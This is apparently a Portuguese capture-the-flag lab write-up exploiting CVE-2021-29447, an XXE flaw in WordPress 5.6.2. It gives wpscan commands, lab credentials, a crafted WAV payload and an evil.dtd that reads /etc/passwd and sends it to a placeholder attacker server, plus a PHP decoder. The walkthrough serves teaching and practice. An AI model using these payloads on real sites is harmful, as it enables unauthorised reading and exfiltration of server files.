#### Task 2
  ##### Questão - Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.
  ##### Resposta - `no need answer`

  ##### Questão - Based on the results of #1, what is the name of the database for WordPress?
  ##### Reposta - `t`
  
Primeiramente -> acesse o arquivo hosts -- digite o comando *`sudo nano /etc/hosts`* e insira um atalho para acesso a maquina virtual do THM.

<img src="img1.png" width="80%">
<img src="img2.png" width="80%">

Com a ferramenta *wpscan* é possível fazer algumas explorações para o endereço que está hospedado o wordpress. Use o comando `wpscan --url http://thm.com -e` para enumerar algumas informações do site.

<img src="img3.png" width="80%">

<img src="img4.png" width="80%">

Identificado que a versão usada do wordpress é 5.6.2.

O login e senha foram informados na Task anterior.
`login = tes-corp`
`password = test`

Após uma leitura breve do CVE é identificado a vunerabilidade, onde envolve o upload de um arquivo de mídia com a extensão *.wav*.

Avaliando o payload é notado a necessidade de um arquivo *.dtd* -> *Document Type Definition* -- Dando poder para o atacante controlar melhor a carga útil do payload. Possibilitando a listagem de elementos valdiados, sendo declato dentro do próprio arquivo XML ou com uma referência externa.

1º Digite o comando - `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > malicius.wav`  -> Percebe-se que o documento XML contém a necessidade de um arquivo .dtd

Comando irá criar um arquivo chamado *malicius.wav*

Verifique se o que foi gerado é um arquivo de áudio. use o comando *file* para confirmar.

<img src = "img5.png" width="80%">

2° Digite o comando `nano evil.dtd`

3° Insira o seguinte código no arquivo - `<!ENTITY % file SYSTEM “php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd”>
<!ENTITY % init “<!ENTITY &#x25; trick SYSTEM ‘http://YOURSERVERIP:PORT/?p=%file;'>" >`

<img src="img6.png" width="80%">

4º Insira o arquivo *payload.wav* no wordpress.

<img src="img7.png" width="80%">

voltando pro terminal, recebemos um mensagem encodada.

5° Criar um arquivo que recebera a mensagem encodada. *nano encode.php* -> no arquivo insiera o comando <?php echo zlib_decode(base64_decode(‘base64here’)); ?>

















